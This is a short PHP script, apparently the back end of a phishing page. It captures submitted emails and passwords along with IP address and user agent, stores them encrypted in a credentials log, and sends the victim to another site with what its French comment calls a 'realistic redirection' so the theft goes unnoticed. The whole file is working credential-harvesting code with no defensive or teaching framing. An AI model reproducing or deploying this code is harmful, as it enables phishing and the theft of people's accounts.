<?php
// your-website/auth.php
header("Content-Security-Policy: default-src 'self'");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $data = [
        'date' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'email' => $_POST['email'] ?? '',
        'password' => $_POST['password'] ?? '',
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ];

    // Chiffrement AES-256
    $key = file_get_contents(__DIR__.'/../.env');
    $iv = substr($key, 0, 16);
    $encrypted = openssl_encrypt(
        json_encode($data),
        'aes-256-cbc',
        $key,
        0,
        $iv
    );

    file_put_contents(__DIR__.'/../logs/credentials.enc', $encrypted.PHP_EOL, FILE_APPEND);
    header("Location: https://example.com"); // Redirection réaliste
    exit;
}
?>
